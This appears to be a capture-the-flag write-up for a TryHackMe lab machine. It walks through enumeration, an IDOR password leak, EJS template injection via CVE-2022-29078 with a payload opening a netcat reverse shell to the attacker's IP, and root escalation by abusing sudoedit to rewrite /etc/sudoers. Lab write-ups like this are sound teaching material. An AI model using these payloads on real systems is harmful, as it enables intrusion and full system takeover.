# <div align="center">[Whiterose](https://tryhackme.com/r/room/whiterose)</div>
<div align="center"> Yet another Mr. Robot themed challenge.</div>
<div align="center">
  <img src="https://github.com/user-attachments/assets/63573b56-425b-415c-9133-31f9b701470b" height="200"></img>
</div>


## Enumeration
```
$ nmap 10.10.200.189  -sV -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 21:14 IST
Nmap scan report for 10.10.200.189
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### There are two ports open.
* ### SSH on port 22.
* ### HTTP on port 80.

### Add this to hosts file to access webservers,
```
sudo echo "<IP> cyprusbank.thm"|sudo tee -a /etc/hosts
```

<div align="center">
  <img src="https://github.com/user-attachments/assets/7c84a030-1eb2-4198-b51a-09d6ed1e2e93" height="200"></img>
</div>

## Vhost Enumeration
```
$ ffuf -w /snap/seclists/572/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H "Host:FUZZ.cyprusbank.thm" -fw 1 -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cyprusbank.thm/
 :: Wordlist         : FUZZ: /snap/seclists/572/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 157ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 164ms]
:: Progress: [114441/114441] :: Job [1/1] :: 1240 req/sec :: Duration: [0:01:37] :: Errors: 0 :: 
```
### We found admin and lets Add this to ```/etc/hosts```
```
sudo echo "<IP> cyprusbank.thm admin.cyprusbank.thm" | sudo tee -a /etc/hosts
````
## Visiting ```http://admin.cyprusbank.thm/login```
### The login credential are provided already
* ### Username: ```Olivia Cortez```
* ### Password: ```olivi8```

<div align="center">
  <img src="https://github.com/user-attachments/assets/6b2cb3d2-49fa-497d-a347-55a31c003e21" height="200"></img>
</div>

## IDOR 
#### As I checked, I noticed that we have limited permissions with this account, which prevents us from taking any significant actions. However, while navigating to the messages section, I discovered some intriguing chats between Olivia and Gayle. By modifying the URL parameter to set the value of ```/?c=``` to 0 and then to 10, I was able to retrieve Gayle's password through an IDOR (Insecure Direct Object Reference) vulnerability.
* ## ```http://admin.cyprusbank.thm/messages/?c=10```

```
Cyprus National Bank - Admin Chat

Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'

DEV TEAM: Alright we are trying to implement chat history, everything should be ready in week or so

Gayle Bev: That's nice to hear!

Gayle Bev: Developers implemented this new messaging feature that I suggested! What you guys think?

Greger Ivayla: Looks really cool!

Jemmy Laurel: Hey have you guys seen Mrs. Jacobs recently??

Olivia Cortez: No she hasn't been around for a while

Jemmy Laurel: Oh, is she OK?
```
* ### Gayle Bev
* ### p~]P@5!6;rs558:q

## Let's log in to Gayle Bev's account.

<div align="center">
  <img src="https://github.com/user-attachments/assets/f2b1b949-7638-4966-a2c1-20782e52d305" height="200"></img>
</div>

### Now we are able to see all the details

<div align="center">
  <img src="https://github.com/user-attachments/assets/a4b0de2b-8b31-4a80-897b-59e374a25f19" height="400"></img>
</div>

### At setting tab we can change the password of the users
<div align="center">
  <img src="https://github.com/user-attachments/assets/5f8dcf57-0af6-4716-93be-bfd11e6b19d0" height="400"></img>
</div>

### After testing the name and password parameters for vulnerabilities such as SQL injection, XSS, and SSTI, we didn't find any issues. Let's intercept this request in Burp Suite to investigate further.

### Origional Request
<div align="center">
  <img src="https://github.com/user-attachments/assets/b48edbab-80be-451c-8068-5db3850db57c height="400"></img>
</div>

## When I remove the password parameter, I encounter the following error:

<div align="center">
  <img src="https://github.com/user-attachments/assets/fbb5933d-ee74-4ae1-b866-fa03203e745bhttps://github.com/user-attachments/assets/1d2d2cef-3f67-45c1-b0d8-bb115be82029" height="600></img>
</div>


<div align="center">
  <img src="https://github.com/user-attachments/assets/a49fbb78-a1d7-499c-950a-228535b5bc15" height="400"></img>
</div>

## Upon closely examining I discovered that EJS Server-side template injection, which could potentially lead to RCE (Remote Code Execution) and We get the shell here.
## Only a limited number of options can typically be passed with the data. However, the CVE-2022-29078 vulnerability allows us to bypass this restriction. By using the ```settings['view options']``` parameter, we can pass any option without limitation.

## Capture the request and edit it and send:
```
name=a&password=a&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.17.11.253 1234 -e bash');s
```
![image](https://github.com/user-attachments/assets/67462093-635d-4ae6-936e-1d9111a282f8)

## Open Nc to get reverse connection.
```
nc -lnvp 1234
```

![image](https://github.com/user-attachments/assets/f4e563d5-8730-44fc-a442-f71a06c6508e)

## We got our connection let import shell:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
$ nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.200.189 56326
python3 -c 'import pty;pty.spawn("/bin/bash")'
web@cyprusbank:~/app$ 
```
## User Flag
```
cat /home/web/user.txt
```
<!--```
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```-->
```
THM{4lw_____!3s}
```
# Privilege Escalation
```
web@cyprusbank:~$ sudo -l
sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
web@cyprusbank:~$
```
```
export TERM=xterm
```
```
web@cyprusbank:~/app$ export TERM=xterm
export TERM=xterm
web@cyprusbank:~/app$ ^Z
[1]+  Stopped                 nc -lnvp 1234
death@esther:~$ stty raw -echo; fg
nc -lnvp 1234

web@cyprusbank:~/app$ 
```

### We see that we can run ```sudoedit``` as root without a password for this file ```/etc/nginx/sites-available/admin.cyprusbank.thm```

### Let open this in Editor
```
export EDITOR="nano -- /etc/sudoers"
```
```
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

```
web ALL=(root) NOPASSWD: ALL
```
```
sudo su
```
```
web@cyprusbank:~/app$ export SUDO_EDITOR='nano -- /etc/sudoers'
web@cyprusbank:~/app$ sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
sudoedit: --: editing files in a writable directory is not permitted
web@cyprusbank:~/app$ sudo su
root@cyprusbank:/home/web/app# cat /root/root.txt
THM{4nd_****4g3s}
root@cyprusbank:/home/web/app# 
```
done
<!--THM{4nd_uR_p4ck4g3s}-->




![Screenshot from 2024-11-09 22-08-29](https://github.com/user-attachments/assets/2a337717-25d7-4863-9adb-6006dd2d467f)
![Screenshot from 2024-11-09 22-05-30](https://github.com/user-attachments/assets/850ca083-3892-423f-b43e-94c0b1daf80d)
![Screenshot from 2024-11-09 22-05-23](https://github.com/user-attachments/assets/c33f75c6-43a2-4745-b2c7-0874963b1129)






<div align="center">
  <img src="" height="400"></img>
</div>
